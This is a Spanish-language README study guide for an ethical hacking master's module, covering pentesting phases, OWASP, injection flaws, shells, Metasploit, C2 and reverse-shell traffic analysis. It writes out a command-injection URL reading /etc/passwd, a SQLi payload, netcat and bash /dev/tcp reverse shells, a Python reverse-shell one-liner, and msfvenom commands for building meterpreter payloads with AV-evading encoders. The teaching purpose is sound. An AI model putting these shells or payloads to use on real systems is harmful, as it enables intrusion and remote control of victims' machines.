<h1 align="center">🛡️ Hacking Ético — Máster en Ciberseguridad</h1>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.x-blue.svg?logo=python&logoColor=white" alt="Python 3">
  <img src="https://img.shields.io/badge/Kali-Linux-557C94?logo=kalilinux&logoColor=white" alt="Kali Linux">
  <img src="https://img.shields.io/badge/TryHackMe-CTFs-red?logo=tryhackme&logoColor=white" alt="TryHackMe">
  <img src="https://img.shields.io/badge/Módulo-Hacking%20Ético-darkred.svg?logo=hackthebox&logoColor=white" alt="Hacking Ético">
  <img src="https://img.shields.io/badge/Grado-Máster%20en%20Ciberseguridad-gold.svg" alt="Máster Ciberseguridad">
</p>

<p align="center">
  <i>Repositorio de prácticas, retos CTF y laboratorios del módulo de Hacking Ético del Máster en Ciberseguridad.<br>
  Este documento sirve como guía de estudio completa del módulo — toda la teoría del temario en un solo lugar, enlazada con las prácticas del repositorio.</i>
</p>

---

## 📑 Índice

1. [Contenido del Repositorio](#-contenido-del-repositorio)
2. [Pentesting](#-1--pentesting)
3. [Tipos de Pentesting](#-2--tipos-de-pentesting)
4. [Fases del Pentesting](#-3--fases-del-pentesting)
5. [Vulnerabilidades — Clasificación](#-4--vulnerabilidades--clasificación)
6. [Identificación: CVE y CVSS](#-5--identificación-cve-y-cvss)
7. [Consultar Vulnerabilidades](#-6--consultar-vulnerabilidades)
8. [Vulnerabilidades Web y OWASP Top 10](#-7--vulnerabilidades-web-y-owasp-top-10)
9. [Command Injection (CMDi)](#-8--command-injection-cmdi)
10. [SQL Injection (SQLi)](#-9--sql-injection-sqli)
11. [Shells](#-10--shells)
12. [Reverse Shells, Metasploit y C2](#-11--reverse-shells-metasploit-y-c2)
13. [Crear Malware con msfvenom](#-12--crear-malware-con-msfvenom)
14. [Análisis de Tráfico de Reverse Shells](#-13--análisis-de-tráfico-de-reverse-shells)

---

## 📁 Contenido del Repositorio

```text
hacking-etico-master/
└── ctf/
    ├── challs/               🧩 10 retos TCP locales (Twisted) — un único contenedor Docker
    ├── thm/
    │   └── easy/
    │       ├── pickle-rick/  🥒 Autopwn Python: RCE → Reverse Shell → Escalada → Persistencia SSH
    │       └── wgel-ctf/    🫠 Recon → SSH key expuesta → sudo wget → root flag
    └── laboratorios/
        └── httprce-jailbreak/ 🔓 Lab local: HTTP RCE API + Python Jailbreak con blacklist
```

| Proyecto | Vectores cubiertos | README |
|:---|:---|:---|
| 🧩 **challs** | Criptografía, hashing, CMDi, aritmética, Python jailbreak | [Ver](ctf/challs/README.md) |
| 🥒 **pickle-rick** | CMDi, RCE, Reverse Shell, escalada, persistencia SSH | [Ver](ctf/thm/easy/pickle-rick/README.md) |
| 🫠 **wgel-ctf** | Reconocimiento, enumeración web, SSH, sudo abuse (GTFOBins) | [Ver](ctf/thm/easy/wgel-ctf/README.md) |
| 🔓 **httprce-jailbreak** | HTTP RCE, Python Jailbreak, bypass de blacklist | [Ver](ctf/laboratorios/httprce-jailbreak/README.md) |

---

## 🔍 1 — Pentesting

El **pentesting** o pruebas de penetración es un proceso de evaluación de seguridad que consiste en realizar ataques simulados contra un sistema, red o aplicación para identificar y explotar vulnerabilidades. El objetivo es descubrir debilidades antes de que puedan ser aprovechadas por actores maliciosos.

### Objetivos del Pentesting

| Objetivo | Descripción |
|:---|:---|
| **Identificación de vulnerabilidades** | Detectar puntos débiles explotables en sistemas o aplicaciones |
| **Evaluación del riesgo** | Estimar el impacto en términos de **C**onfidencialidad, **I**ntegridad y **D**isponibilidad (CIA) |
| **Recomendación de soluciones** | Proponer medidas correctivas y preventivas |
| **Cumplimiento normativo** | Asegurar conformidad con PCI-DSS, ISO 27001, etc. |

### Tipos de sistemas evaluados

- **Aplicaciones web** — seguridad de aplicaciones y servicios HTTP/HTTPS
- **Servidores y redes** — infraestructuras internas y expuestas al exterior
- **Dispositivos móviles** — aplicaciones y sistemas operativos móviles
- **Infraestructura en la nube** — AWS, Azure, Google Cloud

---

## 🎭 2 — Tipos de Pentesting

### Caja Blanca (White Box)

El pentester tiene **acceso completo** a la información: documentación, código fuente, credenciales, mapas de red. Permite pruebas exhaustivas detectando fallos internos que un atacante externo no vería directamente.

**Ventajas:** Mayor cobertura, detección de errores lógicos internos, pruebas más rápidas  
**Desventajas:** Menor realismo, no refleja cómo actuaría un atacante externo real

### Caja Negra (Black Box)

El pentester **no tiene ningún conocimiento** previo. Simula completamente un ataque externo real, comenzando el reconocimiento desde cero.

**Ventajas:** Máximo realismo, detecta fallas visibles externamente  
**Desventajas:** Mayor tiempo requerido, posible menor profundidad interna

### Caja Gris (Grey Box)

Enfoque **intermedio**: el pentester recibe información parcial (credenciales básicas, diagramas limitados). Simula ataques desde usuarios legítimos con privilegios reducidos.

**Ventajas:** Balance realismo/profundidad, más eficiente que black box  
**Desventajas:** Cobertura parcial, dependiente de la calidad de la información suministrada

### Tabla Comparativa

| Tipo | Acceso preconcedido | Realismo ante ataque externo | Profundidad de pruebas |
|:---:|:---:|:---:|:---:|
| **Caja Blanca** | Completo | 🔴 Bajo | 🟢 Alta |
| **Caja Negra** | Ninguno | 🟢 Alto | 🔴 Baja |
| **Caja Gris** | Parcial | 🟡 Medio | 🟡 Media |

> [!NOTE]
> Los CTFs de TryHackMe como Pickle Rick y Wgel funcionan bajo metodología de **caja negra** — se arranca solo con la IP objetivo.

---

## ⚙️ 3 — Fases del Pentesting

### 1. Reconocimiento

Recopilación de información sobre el objetivo **sin interacción intrusiva directa**.

- **Pasivo:** búsqueda en OSINT, DNS, redes sociales, `whois`, sin tocar el objetivo
- **Activo:** escaneos de puertos y mapeo de red que sí interactúan con el sistema

> [!TIP]
> 📌 **Aplicado en este repo:** Fase de reconocimiento con `nmap -sS -T4` en [Wgel CTF](ctf/thm/easy/wgel-ctf/README.md) → Descubiertos puertos 22 (SSH) y 80 (HTTP).

### 2. Escaneo

Búsqueda detallada de puertos, servicios y vulnerabilidades específicas mediante herramientas:

- `nmap` — escaneo de puertos y fingerprinting de servicios
- `gobuster` / `dirb` — enumeración de directorios web
- `nessus` / `OpenVAS` — escáneres de vulnerabilidades

> [!TIP]
> 📌 **Aplicado en este repo:** Triple pasada de `gobuster` en [Wgel CTF](ctf/thm/easy/wgel-ctf/README.md) con distintas wordlists hasta descubrir `/.ssh` con la clave RSA expuesta.

### 3. Explotación

Aprovechar las vulnerabilidades identificadas para obtener acceso no autorizado.

- Uso de herramientas como `Metasploit` o exploits personalizados
- Objetivo: acceder a recursos, escalar privilegios o interrumpir servicios
- **Documentar cada acción** — imperativo ético y legal

> [!TIP]
> 📌 **Aplicado en este repo:** Explotación de panel de comandos en [Pickle Rick](ctf/thm/easy/pickle-rick/README.md) → RCE → reverse shell. Escalada de privilegios con `sudo wget` en [Wgel CTF](ctf/thm/easy/wgel-ctf/README.md).

### 4. Post-Explotación

Evaluación del impacto real una vez dentro del sistema:

- **Persistencia:** backdoors, crontabs, usuarios ocultos, claves SSH
- **Lateral movement:** acceso a otras máquinas de la red interna
- **Exfiltración:** extracción de datos sensibles, credenciales, configuraciones
- **Escalada de privilegios:** de usuario → root / admin

> [!TIP]
> 📌 **Aplicado en este repo:** Persistencia mediante inyección de clave SSH pública en `/root/.ssh/authorized_keys` en [Pickle Rick PoC-08](ctf/thm/easy/pickle-rick/archivo_pocs/PoC-08/).

### 5. Informe de Resultados

Documento final que resume el trabajo realizado:

- Descripción detallada de vulnerabilidades encontradas
- Evaluación de impacto (confidencialidad, integridad, disponibilidad)
- Recomendaciones de mitigación prácticas y priorizadas

---

## 🔴 4 — Vulnerabilidades — Clasificación

Las vulnerabilidades son debilidades en un sistema, red o software que pueden ser explotadas para comprometer la **C**onfidencialidad, **I**ntegridad o **D**isponibilidad (tríada CIA).

| Tipo | Descripción | Ejemplos clave |
|:---|:---|:---|
| **Ejecución de código (RCE)** | El atacante ejecuta código arbitrario en el sistema | Buffer Overflow, SQLi, CMDi |
| **Bypass** | Eludir mecanismos de seguridad (auth, filtros, WAF) | Auth Bypass, filtros XSS bypasseados |
| **Escalada de privilegios** | Usuario limitado obtiene permisos de root/admin | Kernel exploits, SUID mal configurado, `sudo` misconfiguration |
| **Denegación de Servicio (DoS)** | El sistema deja de responder a usuarios legítimos | SYN Flood, buffer exhaustion, resource starvation |
| **Fuga de información** | Acceso no autorizado a datos sensibles | Configuraciones expuestas, error leakage, directorios accesibles |

> [!TIP]
> 📌 **Aplicado en este repo:** `httrpce-jailbreak` cubre RCE directo. Wgel CTF cubre fuga de información (clave SSH expuesta) + escalada de privilegios (sudo wget).

---

## 🏷️ 5 — Identificación: CVE y CVSS

### CVE — Common Vulnerabilities and Exposures

Sistema estandarizado mantenido por **MITRE Corporation** que asigna un identificador único a cada vulnerabilidad conocida.

```
Formato: CVE-<año>-<número>
Ejemplo: CVE-2023-12345
```

- Permite comunicación unívoca entre profesionales de seguridad
- No proporciona detalles técnicos profundos — actúa como identificador universal

### CVSS — Common Vulnerability Scoring System

Estándar para medir la **gravedad** de vulnerabilidades y priorizar cuáles abordar primero.

| Componente | Descripción |
|:---|:---|
| **Base Score** | Severidad intrínseca sin considerar el entorno |
| **Temporal Score** | Ajuste según disponibilidad de parche o exploit activo |
| **Environmental Score** | Ajuste según el impacto específico en la organización |

**Escala de puntuación (0 a 10):**

| Rango | Nivel | Acción |
|:---:|:---:|:---|
| 0.1 – 3.9 | 🟢 Bajo | Monitorizar |
| 4.0 – 6.9 | 🟡 Medio | Planificar corrección |
| 7.0 – 8.9 | 🟠 Alto | Abordar urgente |
| 9.0 – 10.0 | 🔴 Crítico | Parchear inmediatamente |

---

## 🔎 6 — Consultar Vulnerabilidades

### CVE Details — [cvedetails.com](https://www.cvedetails.com)

- Interfaz amigable para búsquedas rápidas por producto/versión
- Muestra métricas CVSS, productos afectados y exploits relacionados
- Ideal para análisis comparativos por fabricante

### NVD — National Vulnerability Database — [nvd.nist.gov](https://nvd.nist.gov)

- Mantenida por el **NIST** (USA) — referencia oficial
- Detalles técnicos profundos + puntuaciones CVSS actualizadas
- Recomendaciones de mitigación y filtrado por gravedad, producto y categoría

| | CVE Details | NVD |
|:---|:---:|:---:|
| **Orientado a** | Búsqueda rápida / estadísticas | Análisis técnico profundo |
| **Interfaz** | Intuitiva | Más técnica |
| **CVSS** | Sí | Sí (más detallado) |
| **Guías de mitigación** | Limitadas | Extensas |

---

## 🌐 7 — Vulnerabilidades Web y OWASP Top 10

Una **vulnerabilidad web** es un fallo en el código de una aplicación explotable para alterar su comportamiento normal, acceder a datos protegidos o tomar control del servidor.

### Vulnerabilidades comunes

| Vulnerabilidad | Descripción |
|:---|:---|
| **XSS** (Cross-Site Scripting) | Inyección de scripts maliciosos en páginas vistas por otros usuarios; robo de cookies, phishing |
| **CSRF** (Cross-Site Request Forgery) | Fuerza a un usuario autenticado a ejecutar acciones no deseadas |
| **RCE** (Remote Code Execution) | Ejecución de código arbitrario en el servidor |
| **CMDi** (Command Injection) | Ejecución de comandos del SO mediante entradas no sanitizadas |
| **SQLi** (SQL Injection) | Interacción maliciosa con la base de datos mediante comandos SQL no autorizados |

### OWASP Top 10 (2021)

| ID | Nombre | Descripción breve |
|:---:|:---|:---|
| **A01** | Broken Access Control | Control de acceso incorrectamente implementado |
| **A02** | Cryptographic Failures | Algoritmos débiles o ausencia de cifrado en datos sensibles |
| **A03** | Injection | SQL, LDAP, XPath, CMDi — entrada no confiable interpretada como código |
| **A04** | Insecure Design | Fallos de seguridad en la fase de arquitectura |
| **A05** | Security Misconfiguration | Componentes con configuración por defecto insegura |
| **A06** | Vulnerable & Outdated Components | Librerías y frameworks con CVEs conocidos sin parchear |
| **A07** | Identification & Auth Failures | Fallos en autenticación que permiten suplantación de identidad |
| **A08** | Software & Data Integrity Failures | Falta de validación de actualizaciones — permite código malicioso |
| **A09** | Security Logging & Monitoring Failures | Sin monitoreo adecuado, los ataques no se detectan ni responden |
| **A10** | SSRF | El servidor realiza solicitudes no autorizadas a servicios internos |

> [!NOTE]
> 📌 **Aplicado en este repo:** `wgel-ctf` cubre **A02** (clave SSH expuesta) y **A05** (misconfiguration del directorio `.ssh`). `httprce-jailbreak` cubre **A03** (CMDi directa en API Flask).

---

## 💣 8 — Command Injection (CMDi)

Vulnerabilidad que ocurre cuando una aplicación **ejecuta comandos del SO basados en entradas de usuario sin validación**. El atacante inserta comandos arbitrarios que se ejecutan con los privilegios de la aplicación.

### Ejemplo vulnerable

```php
<?php
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);
echo "<pre>$output</pre>";
?>
```

El parámetro `ip` se concatena directamente al comando. Un atacante puede enviar:

```
http://example.com/ping.php?ip=8.8.8.8;cat /etc/passwd
```

El `;` separa comandos en bash — se ejecuta el ping **y** se lee `/etc/passwd`.

### Operadores de encadenamiento en CMDi

| Operador | Comportamiento |
|:---:|:---|
| `;` | Ejecuta ambos comandos siempre |
| `&&` | Ejecuta el segundo solo si el primero tiene éxito |
| `\|\|` | Ejecuta el segundo solo si el primero falla |
| `\|` (pipe) | Pasa la salida del primero como entrada del segundo |
| `` `cmd` `` | Sustitución de comandos (backticks) |

### Pasos de explotación CMDi

1. **Identificación:** enviar entradas con `;`, `&&`, `|` y observar la respuesta
2. **Inyección:** confirmar ejecución con comandos simples (`id`, `whoami`, `ls`)
3. **Escalado:** obtener reverse shell, escalar privilegios, movimiento lateral

> [!TIP]
> 📌 **Aplicado en este repo:** El panel de comandos de [Pickle Rick](ctf/thm/easy/pickle-rick/README.md) es vulnerable a CMDi directa. El lab [httprce-jailbreak](ctf/laboratorios/httprce-jailbreak/README.md) tiene un endpoint Flask que pasa la URL a `subprocess.run(shell=True)`.

---

## 🗄️ 9 — SQL Injection (SQLi)

Vulnerabilidad que permite al atacante **interferir en las consultas SQL** que una aplicación hace a su base de datos, insertando código SQL no autorizado a través de entradas sin sanitizar.

### Ejemplo vulnerable

```php
<?php
$username = $_GET['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($connection, $query);
?>
```

Payload de ataque: `' OR '1'='1`

La consulta resultante:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1';
```

La condición `'1'='1'` es siempre verdadera — devuelve todos los usuarios sin necesitar credenciales.

### Tipos de SQLi

<details>
<summary><b>▸ Inyección Clásica / In-Band (más común)</b></summary>

Resultado de la consulta visible directamente en la respuesta HTTP.

- **Basada en errores:** se fuerzan errores de BD que revelan información técnica (rutas, versiones, estructura de tablas)
- **UNION-based:** se usa `UNION SELECT` para combinar resultados de otras tablas y extraer datos ajenos

</details>

<details>
<summary><b>▸ Blind SQL Injection</b></summary>

La aplicación no muestra los resultados directamente. Se infiere a partir del comportamiento:

- **Boolean-based:** consultas que devuelven `true`/`false` — se deduce información carácter a carácter por fuerza bruta
- **Time-based:** se introduce `SLEEP()` o `WAITFOR DELAY` — si la respuesta tarda, la condición es verdadera

</details>

---

## 🐚 10 — Shells

En el contexto de la seguridad web, una **shell** es una interfaz de línea de comandos que permite la interacción directa con el sistema operativo comprometido.

### Bind Shell

El servidor comprometido **abre un puerto** y espera a que el atacante se conecte.

```bash
# En el servidor comprometido — abre shell en puerto 4444
nc -lvp 4444 -e /usr/bin/bash

# El atacante se conecta
nc <IP_SERVIDOR> 4444
```

**Limitación:** los firewalls suelen bloquear conexiones entrantes al servidor.

### Reverse Shell

La máquina comprometida **inicia la conexión** hacia el atacante. Ideal cuando el servidor tiene restricciones de puertos entrantes pero conexiones salientes permitidas.

```bash
# Atacante — escucha en puerto 4444
nc -lvnp 4444

# En el servidor comprometido — conecta de vuelta
nc <IP_ATACANTE> 4444 -e /bin/bash
```

> [!TIP]
> Generador online de reverse shells en múltiples lenguajes: **[revshells.com](https://revshells.com)**

> [!TIP]
> 📌 **Aplicado en este repo:** [Pickle Rick PoC-04](ctf/thm/easy/pickle-rick/archivo_pocs/PoC-04/) implementa una reverse shell Python pura sin dependencias externas.

### Shells Restringidas (Jailbreak)

Una **shell restringida** limita qué comandos puede ejecutar el usuario. Implementadas por administradores para aislar entornos.

Ejemplos:
- **rbash** (restricted bash): deshabilita `cd`, modificación de `$PATH`, comandos externos
- **Entornos chroot**: "jaula" al usuario en una sección del sistema de archivos

**Técnicas de escape comunes:**
- Invocar shell completa desde comandos permitidos: `vi` → `:!/bin/bash`, `python -c "import pty; pty.spawn('/bin/bash')"`
- Ejecutar scripts Python/Perl si están disponibles
- Explotar binarios con SUID o `sudo` sin contraseña (→ GTFOBins)

> [!TIP]
> 📌 **Aplicado en este repo:** [Reto 4 de challs](ctf/challs/README.md) implementa un REPL Python con `__builtins__=None` (jailbreak). El lab [jailbreak.py](ctf/laboratorios/httprce-jailbreak/README.md) tiene una blacklist de comandos bypasseable por diseño.

---

## 🎯 11 — Reverse Shells, Metasploit y C2

### Reverse Shells — Lenguajes más comunes

| Lenguaje | Uso típico |
|:---|:---|
| **Bash** | Sistemas Unix/Linux — rapidez y disponibilidad |
| **Python** | Versátil, disponible en casi todo servidor Linux |
| **PHP** | Entornos web — interactúa directamente con el servidor HTTP |
| **C/C++** | Bajo nivel, mayor rendimiento y control |

**Ejemplos (atacante en `192.168.1.5:4444`):**

```bash
# Bash
sh -i >& /dev/tcp/192.168.1.5/4444 0>&1

# Listener (todos los casos)
rlwrap nc -lvnp 4444
```

```python
# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
```

### Metasploit

Framework de código abierto para pruebas de penetración, creado por H.D. Moore (2003), mantenido por **Rapid7**. Arquitectura modular:

| Tipo de módulo | Función |
|:---|:---|
| **Exploits** | Aprovechan vulnerabilidades en sistemas, apps o dispositivos de red |
| **Payloads** | Código que se ejecuta tras la explotación (reverse shell, meterpreter, etc.) |
| **Encoders** | Codifican payloads para evadir AV/IDS (firmas estáticas) |
| **Post-exploitation** | Acciones tras el compromiso: persistencia, escalada, exfiltración |

### Meterpreter

Payload avanzado de Metasploit diseñado para operar de forma **sigilosa y cifrada**.

| Característica | Descripción |
|:---|:---|
| **Shell interactiva** | Terminal completa sobre el sistema comprometido |
| **Acceso al SO** | Enumeración de procesos, servicios, capturas de pantalla, registros |
| **Post-explotación** | Escalada de privilegios, recolección de credenciales, scripts custom |
| **Persistencia** | Reconexión automática tras reinicio del sistema comprometido |
| **Tráfico encubierto** | Cifrado y ofuscación del canal de comunicación |
| **Extensible** | Plugins y extensiones de la comunidad |

### Servidores C2 (Command & Control)

Punto centralizado de gestión de dispositivos comprometidos. El malware instalado en la víctima se comunica con el C2 para recibir instrucciones.

**Funcionamiento:**
1. Malware infecta dispositivo → se contacta con el C2
2. C2 envía comandos (exfiltrar datos, instalar más malware, atacar terceros)
3. El C2 recopila datos de todas las víctimas controladas
4. Los atacantes coordinan desde una interfaz centralizada

**Características de los C2:**
- Comunicación **cifrada** para evadir IDS/IPS
- Distribución geográfica y redundancia para resiliencia
- Automatización de tareas sin intervención manual
- Anonimato mediante proxies, Tor o servicios cloud legítimos

**Ejemplos de infraestructura C2:**

| Tipo | Ejemplo |
|:---|:---|
| **Cloud** | Instancias AWS/Azure — difícil distinguir del tráfico legítimo |
| **VPS** | DigitalOcean, Linode, Vultr — servidores distribuidos y efímeros |
| **Redes sociales** | Twitter/LinkedIn DMs con comandos encriptados |
| **Servicios legítimos** | Dropbox/Google Drive como canal encubierto de C2 |

---

## ⚗️ 12 — Crear Malware con msfvenom

**msfvenom** combina la generación de payloads y la codificación para evasión en una sola herramienta del framework Metasploit.

### Sintaxis

```bash
msfvenom -p <payload> LHOST=<IP_ATACANTE> LPORT=<PUERTO> -f <formato> -o <archivo>
```

| Parámetro | Descripción |
|:---:|:---|
| `-p` | Payload a utilizar |
| `LHOST` | IP del atacante (C2) que recibirá la conexión |
| `LPORT` | Puerto de escucha en el atacante |
| `-f` | Formato del archivo de salida (`exe`, `elf`, `apk`, `raw`...) |
| `-o` | Archivo de salida |

### Tipos de Payload

| Tipo | Descripción | Ejemplo |
|:---|:---|:---|
| **Staged** | Dos fases: stager pequeño descarga el stage completo desde el C2 | `windows/meterpreter/reverse_tcp` |
| **Stageless** | Un único payload completo, sin segunda descarga | `windows/x64/meterpreter_reverse_tcp` |

> Staged es más pequeño (evita sospechas iniciales). Stageless es más independiente.

### Generación por plataforma

```bash
# Windows — ejecutable .exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe

# Linux — ejecutable ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf

# Android — APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> R > payload.apk
```

### Empaquetado y Ofuscación

El objetivo es evadir la detección por firma de antivirus (AV), IDS e IPS.

| Codificador | Técnica |
|:---|:---|
| `x86/shikata_ga_nai` | Polimórfico — muta el payload en cada generación |
| `cmd/powershell_base64` | Codifica en Base64 para scripts PowerShell |

> [!WARNING]
> La ofuscación **no garantiza** indetectabilidad total — dificulta la detección estática pero no el análisis de comportamiento.

**Codificación en capas** (opción `-i N`): el payload se transforma N veces antes de llegar a su forma ejecutable final.

---

## 🔬 13 — Análisis de Tráfico de Reverse Shells

### Introducción al Análisis Forense Digital

El **análisis forense digital** es el proceso de identificar, preservar, analizar y presentar evidencias digitales de forma admisible en un contexto legal. Su objetivo es reconstruir eventos de una violación de seguridad.

| Área | Enfoque |
|:---|:---|
| **Forense en sistemas (endpoint)** | Discos, RAM, registros, archivos de apps — post-ataque |
| **Forense de red** | Tráfico en tiempo real o histórico — puede ser proactivo |
| **Forense móvil** | Apps y datos en dispositivos móviles |

**Diferencias clave forense de sistemas vs. red:**

| | Sistemas | Red |
|:---|:---:|:---:|
| **Alcance** | Granular (dispositivo) | Global (entorno) |
| **Velocidad** | Reactivo | Puede ser proactivo |
| **Persistencia de datos** | Alta (disco) | Volátil (captura activa necesaria) |

### Análisis de Tráfico — Para qué sirve

- **Detección de intrusiones:** conexiones sospechosas o inesperadas
- **Análisis de malware:** comunicaciones C2 o exfiltración de datos
- **Prevención:** identificar patrones de ataque para mejorar defensas
- **Cumplimiento legal:** evidencias admisibles en investigaciones

### Tráfico Normal vs. Tráfico Malicioso

| | Tráfico Normal | Tráfico Malicioso (Reverse Shell) |
|:---|:---|:---|
| **Protocolos** | HTTP, HTTPS, DNS, SMB | Puertos no estándar, SSH en puertos raros |
| **Dirección** | Cliente interno → Servidor externo | Víctima → Atacante (inverso) |
| **Patrón** | Predecible y consistente | Paquetes pequeños y frecuentes, duración prolongada |
| **Cifrado** | HTTPS estándar | Tunelización y ofuscación para evasión |

### Características de una Reverse Shell en el tráfico

| Indicador | Descripción |
|:---|:---|
| **Conexión saliente inesperada** | El servidor inicia la conexión hacia el exterior (inverso al flujo normal) |
| **Puertos no convencionales** | Puerto 4444 (Metasploit), 1234, 9001, etc. — raros en tráfico legítimo |
| **Bajo ancho de banda** | Comandos pequeños + respuestas cortas — sesiones de poco volumen |
| **Larga duración** | La sesión permanece abierta mientras el atacante controla el sistema |
| **Técnicas de evasión** | Cifrado no estándar, tunelización HTTP/DNS, fragmentación |

> [!NOTE]
> Herramientas de análisis de tráfico: **Wireshark** (análisis manual de paquetes), **Zeek/Bro** (análisis de flujo), **Suricata** (IDS con reglas de detección).

---

<hr>
<p align="center">
  <i>Documentado como parte del módulo de Hacking Ético — Máster en Ciberseguridad.<br>
  Este README es un documento vivo que irá creciendo con las prácticas del módulo.</i>
</p>
